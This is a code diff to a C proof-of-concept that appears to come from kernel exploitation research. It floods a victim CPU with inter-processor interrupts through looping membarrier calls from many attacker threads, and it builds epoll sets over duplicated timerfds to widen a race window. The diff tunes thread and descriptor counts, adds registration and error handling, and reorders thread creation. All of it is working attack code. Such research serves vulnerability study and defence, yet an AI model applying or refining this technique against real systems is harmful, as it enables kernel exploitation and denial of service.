@@ -11,17 +11,18 @@
 #include <sys/select.h> // for select()
 #include <time.h> // for time()
 #include <sys/epoll.h> // for epoll_create1()
+#include <errno.h>
 
 pthread_spinlock_t lock;
 
 #define SYS_membarrier      324
 
-#define NUM_THREADS         22
+#define NUM_THREADS         7
 #define VICTIM_CPU          0
 #define ATTACKER_CPU        1
 
 #define EPOLL_INSTANCES     100
-#define FD_PER_EPOLL        50
+#define FD_PER_EPOLL        500
 
 int **tfdups;
 pthread_t spin_thread, kill_thread;
@@ -58,7 +59,7 @@ void *killTheThread(void *to_kill) {
 	clock_t end = clock();
 	
     double time = (double)1e3*(end-start)/CLOCKS_PER_SEC;
-    if (time >= 500.0f)
+    if (time >= 400.0f)
 		printf("Time to kill thread: %7.2fms with timer resolution %ld\n", time, timer_ns_delay);
 	pthread_exit(NULL);
 }
@@ -149,7 +150,7 @@ int cleanup(int *epollfds, int **tfdups, int num_epolls, int num_tfdups) {
 inline static int
 membarrier(int cmd, unsigned int flags, int cpu_id)
 {
-    return syscall(SYS_membarrier, cmd, flags, cpu_id);
+    return syscall(__NR_membarrier, cmd, flags, cpu_id);
 }
 
 
@@ -168,7 +169,12 @@ void ipi_storm(void *cpu)
     
     while(1)
     {
-        membarrier(MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ, 0, VICTIM_CPU);
+        int ret = membarrier(MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ, MEMBARRIER_CMD_FLAG_CPU, VICTIM_CPU);
+    	if (ret < 0)
+    	{
+    		printf("membarrier syscall failed with error code %d\n", errno);
+    		perror("membarrier()");
+    	}
     }
 }
 
@@ -181,6 +187,20 @@ int main(int argc, char** argv)
     pthread_t ipi_storm_threads[NUM_THREADS];
     int epollfds[EPOLL_INSTANCES];
     timer_ns_delay = atol(argv[1]);
+
+    // Register the current process for private expedited commands
+    int ret = membarrier(MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED_RSEQ, 0, 0);
+    if (ret == -1) {
+        printf("Failed to register for private expedited commands: %s\n", strerror(errno));
+        exit(EXIT_FAILURE);
+    }
+
+    // Call membarrier syscall with private expedited command
+    ret = membarrier(MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ, 0, 0);
+    if (ret == -1) {
+        printf("membarrier syscall failed with error code %d: %s\n", errno, strerror(errno));
+        exit(EXIT_FAILURE);
+    }
 
 
     /*
@@ -244,15 +264,13 @@ int main(int argc, char** argv)
 	
 	
     
+    
+    pthread_create(&kill_thread, NULL, killTheThread, &spin_thread);
     for (int i = 0; i < NUM_THREADS; i++)
     {
         pthread_create(&ipi_storm_threads[i], NULL, ipi_storm, &thread_args[i]);
     }
     
-    pthread_create(&kill_thread, NULL, killTheThread, &spin_thread);
-
-    uint64_t expirations;
-
 
     // timer should expire here
     struct epoll_event events[FD_PER_EPOLL];
